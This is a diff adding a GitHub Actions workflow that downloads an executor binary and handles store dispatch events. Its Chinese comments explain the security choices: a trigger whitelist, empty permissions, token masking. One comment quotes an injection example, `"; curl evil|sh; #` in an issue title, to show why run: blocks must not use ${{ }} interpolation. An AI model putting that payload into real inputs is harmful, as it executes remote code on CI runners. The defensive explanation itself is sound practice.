@@ -1,0 +1,75 @@
+name: on-dispatch
+
+# 触发面白名单（03 §4.2）。**不要加下面这几个**：
+#
+#   issues / issue_comment   —— forge 是公有仓库，任何登录用户都能触发，
+#                               而 job 里带着能写 store 的 PAT。
+#   pull_request_target      —— fork 可触发且带 secret + 读写 token，
+#                               公有仓库最经典的泄密面。
+#   release / push           —— forge 不承载数据，这两个事件在这里没有语义，
+#                               白白扩大攻击面。store 侧的事件由 store 自己转发过来。
+on:
+  repository_dispatch:
+    types: [store-event]
+  workflow_dispatch:
+
+# 本仓库**只有 workflow，没有任何源码**，所以 GITHUB_TOKEN 一个权限都不需要：
+# 执行体走 PAT 从 forge-core 拉，写 store 也走同一把 PAT（§6.2 不变量 1）——
+# 而 PAT 权限是 per-repo 的，这里给得越小越好。
+permissions: {}
+
+# 所有会**写 store** 的 job 共用一个并发组，于是它们互相排队（见 reconcile.yml 里
+# 同名的一组）。串行化的收益是消灭一整类竞态：两个事件同时往同一个 Release 传 asset、
+# 或一个对账正推到一半另一个事件又推一次（非快进拒绝）。
+#
+# cancel-in-progress 必须是 false：这些 job 是**维护动作**，中途取消会留下
+# "asset 传了一半、清单还没重建"的中间态。排队等一会儿是更好的代价。
+# 一天也就几次事件，串行的代价约等于零。
+concurrency:
+  group: store-write
+  cancel-in-progress: false
+
+jobs:
+  handle:
+    runs-on: ubuntu-latest
+    # 兜底。正常一次几秒到几分钟；卡住时在这里被砍掉，而不是占满 6 小时的默认额度。
+    timeout-minutes: 45
+    env:
+      EXEC_REPO: market-of-labs/forge-core
+      EXEC_ASSET: forge-linux-amd64
+    steps:
+      # 本 job **不 checkout 任何东西** —— 这里没有源码要取，而 store 是二进制
+      # 自己浅克隆的（STORE_DIR 留空）。这是那条老规矩的更强版本：以前是"只
+      # checkout forge 自己，免得 PAT 落进工作副本的 .git/config"，现在是
+      # **根本没有工作副本**，PAT 连碰都碰不到。而二进制的 git 封装是用
+      # `-c credential.helper=` 一次性传凭据的，token 不落盘。
+      - name: Fetch executor
+        env:
+          GH_TOKEN: ${{ secrets.STORE_WRITE_TOKEN }}
+        run: |
+          set -euo pipefail
+          echo "::add-mask::$GH_TOKEN"
+          gh release download "$EXEC_REPO" --pattern "$EXEC_ASSET" \
+            --output "$RUNNER_TEMP/forge-bin" --clobber
+          chmod +x "$RUNNER_TEMP/forge-bin"
+
+      - name: Handle event
+        env:
+          # 一切外部数据只经 env 传入；run: 里是固定脚本文本（禁止 ${{ }} 插值）。
+          # 这一条与 store 侧 forward.yml 是同一个理由：`${{ }}` 在 run: 里是
+          # 文本拼接，issue 标题里放一个 `"; curl evil|sh; #` 就能执行。
+          STORE_TOKEN: ${{ secrets.STORE_WRITE_TOKEN }}
+          EVENT: ${{ github.event.client_payload.event || github.event_name }}
+          ISSUE: ${{ github.event.client_payload.issue }}
+          RELEASE_TAG: ${{ github.event.client_payload.releaseTag }}
+          PRERELEASE: ${{ github.event.client_payload.prerelease }}
+          SHA: ${{ github.event.client_payload.sha }}
+          REF: ${{ github.event.client_payload.ref }}
+        run: |
+          set -euo pipefail
+          echo "::add-mask::$STORE_TOKEN"
+          "$RUNNER_TEMP/forge-bin" handle-dispatch
+
+      # 注意 workflow_dispatch 时 client_payload 是空的，EVENT 因而退化成
+      # 字面量 "workflow_dispatch" —— 那正是 handle-dispatch 的第四个分支
+      # （全量对账，§4.3）。手动点一次 Actions 页面就等于点了一次全量对账。
